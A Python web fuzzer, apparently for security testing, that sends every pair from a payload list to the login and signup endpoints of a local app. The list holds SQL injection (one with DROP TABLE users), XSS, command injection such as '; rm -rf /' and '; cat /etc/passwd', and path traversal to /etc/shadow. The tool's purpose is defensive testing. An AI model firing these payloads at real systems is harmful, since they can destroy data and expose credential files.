import requests
from faker import Faker
from itertools import product
import random
import time
import csv
import logging
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import HTTPError
from logging.handlers import RotatingFileHandler

# Initialize faker
fake = Faker()

# URLs for login and signup endpoints
base_url = 'http://127.0.0.1:8080'  # Replace with your base url
login_url = f'{base_url}/login'
signup_url = f'{base_url}/signup'

# Set up logging
log_formatter = logging.Formatter('[%(asctime)s] %(levelname)s: %(message)s')
log_handler = RotatingFileHandler('parameter_fuzzer.log', maxBytes=50000, backupCount=2)
log_handler.setFormatter(log_formatter)
logger = logging.getLogger()
logger.addHandler(log_handler)
logger.setLevel(logging.INFO)

# CSV file setup
csv_file = open('fuzzing_results.csv', mode='w', newline='', encoding='utf-8')
csv_writer = csv.writer(csv_file)
csv_writer.writerow(['URL', 'Username Payload', 'Password Payload', 'Status Code', 'Response Time (s)', 'Response JSON', 'Response Headers'])

# Fuzzing payloads
fuzzing_payloads = [
    # Add payloads as per your requirements
    # List of fuzzing payloads

    # SQL Injection
    "' OR 'a'='a", '" OR "a"="a', "' OR 'a'='a'; --", '" OR "a"="a"; --', "' OR 'a'='a'; DROP TABLE users; --", "' OR 'a'='a'; SELECT * FROM users; --",
    
    # XSS
    "<script>alert('XSS')</script>", '<img src="nonexistent" onerror="alert(\'XSS\')">', "<body onload=\"alert('XSS')\">", '<svg onload="alert(\'XSS\')"/>', '<div style="width:expression(alert(\'XSS\'));">',
    
    # Command Injection
    '; ls', '| ls', '&& ls', '; rm -rf /', '; cat /etc/passwd',
    
    # Path Traversal
    '../etc/passwd', '..\\boot.ini', '../etc/shadow', '..\\Windows\\system.ini',
    
    # Buffer Overflow
    'A'*100, 'A'*1000, 'A'*10000, 'A'*100000, 'A'*1000000,
    
    # Format String Attacks
    '%s%s%s%s%s%s%s%s%s%s', '%x%x%x%x%x%x%x%x%x%x',
    
    # Special Characters and Encodings
    '%00', '%0D%0A', '%20', '%26', '%3Cscript%3E',
    
    # Invalid Input
    '', 'A'*10000, '-1', '!@#$%^&*()[]{};:,./<>?\|`~-=_+'
]

def fuzz_parameter(session, url, username_payload, password_payload):
    headers = {'Content-Type': 'application/json'}
    fuzzing_data = {'username': username_payload, 'password': password_payload}
    try:
        start_time = time.time()
        response = session.post(url, json=fuzzing_data, headers=headers)
        response.raise_for_status()
        response_time = time.time() - start_time
        
        # Handling rate limiting
        if response.status_code == 429:
            retry_after = response.headers.get('Retry-After', 1)
            time.sleep(retry_after)
            response = session.post(url, json=fuzzing_data, headers=headers)

        logger.info(f'Fuzzing {url} with {fuzzing_data}, Status code: {response.status_code}, Response: {response.json()}')
        csv_writer.writerow([url, username_payload, password_payload, response.status_code, response_time, response.json(), response.headers])
    except HTTPError as http_err:
        logger.error(f'HTTP error occurred during request to {url} with {fuzzing_data}: {http_err}')
    except Exception as err:
        logger.error(f'Error occurred during request to {url} with {fuzzing_data}: {err}')

def fuzz_login_signup(url):
    with requests.Session() as session:
        for username_payload, password_payload in product(fuzzing_payloads, repeat=2):
            fuzz_parameter(session, url, username_payload, password_payload)
            time.sleep(0.1)

def main():
    # Create a fake user for testing
    fake_user = {'username': fake.user_name(), 'password': fake.password()}
    try:
        requests.post(signup_url, json=fake_user)
    except Exception as err:
        logger.error(f'Error occurred during user creation: {err}')

    # Fuzz login and signup endpoints
    endpoints = [login_url, signup_url]
    random.shuffle(endpoints)
    with ThreadPoolExecutor() as executor:
        for endpoint in endpoints:
            executor.submit(fuzz_login_signup, endpoint)

    csv_file.close()

if __name__ == '__main__':
    main()
